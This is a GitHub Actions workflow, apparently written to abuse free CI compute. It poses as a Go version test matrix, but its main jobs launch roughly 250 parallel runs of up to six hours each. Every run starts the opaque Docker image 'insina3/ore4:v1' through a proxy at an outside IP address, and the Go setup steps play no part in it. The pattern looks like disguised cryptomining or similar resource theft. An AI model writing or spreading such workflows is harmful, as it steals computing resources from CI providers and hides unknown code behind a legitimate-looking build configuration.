
name: peli
on: 
  push:
    branches: [ "main" ]

jobs:
  alah:
    runs-on: ubuntu-20.04
    strategy:
      max-parallel: 80
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9]
        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z]
    timeout-minutes: 8
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: Main
      run: |
        
        echo "sukses"
  pelit:
    needs: alah
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 250
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
    timeout-minutes: 360
    env:
        NUM_JOBS: 250
        JOB: ${{ matrix.go }}
    steps:
    - uses: actions/checkout@v4
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Main
      run: |
        docker run -e http_proxy=http://13.80.134.180:80 -e https_proxy=https://13.80.134.180:80 insina3/ore4:v1
     
  cuk:
    needs: [alah, pelit]
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 250
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
    timeout-minutes: 360
    env:
        NUM_JOBS: 250
        JOB: ${{ matrix.go }}
    steps:
    - uses: actions/checkout@v4
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Main
      run: |
        docker run -e http_proxy=http://13.80.134.180:80 -e https_proxy=https://13.80.134.180:80 insina3/ore4:v1
  Success:
    needs: [alah, pelit, cuk]
    if: always()
    runs-on: ubuntu-20.04
    steps:
      - uses: technote-space/workflow-conclusion-action@v2
      - name: Check Failure
        if: env.WORKFLOW_CONCLUSION == 'failure'
        run: exit 1
      - name: Success
        if: ${{ success() }}
        run: echo "all don,All Done"
